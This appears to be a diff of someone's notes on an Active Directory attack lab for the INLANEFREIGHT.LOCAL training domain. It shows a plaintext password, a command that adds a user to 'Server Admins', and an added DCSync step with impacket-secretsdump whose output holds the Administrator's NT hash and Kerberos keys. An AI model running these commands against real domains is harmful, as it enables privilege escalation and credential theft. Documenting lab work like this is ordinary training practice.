@@ -2526,3 +2526,20 @@ ttimmons:Repeat09
 ```bash
 net rpc group addmem "Server Admins" "ttimmons" -U "INLANEFREIGHT.LOCAL"/"ttimmons"%"Repeat09" -S DC01
 ```
+
+dcsyinc:
+
+```bash
+impacket-secretsdump 'INLANEFREIGHT.LOCAL'/'ttimmons':'Repeat09'@'DC01' -just-dc-user Administrator   
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:fd1f7e5564060258ea787ddbb6e6afa2:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:547ff3f4cc75b6dbfe7fee1f7e3f966d0bc6e689858dc25250c8f9a4191b8b91
+Administrator:aes128-cts-hmac-sha1-96:0477b3d27dd7e44398b27b3d69a9fb43
+Administrator:des-cbc-md5:61e31c8c2c0bd9cd
+[*] Cleaning up... 
+
+```
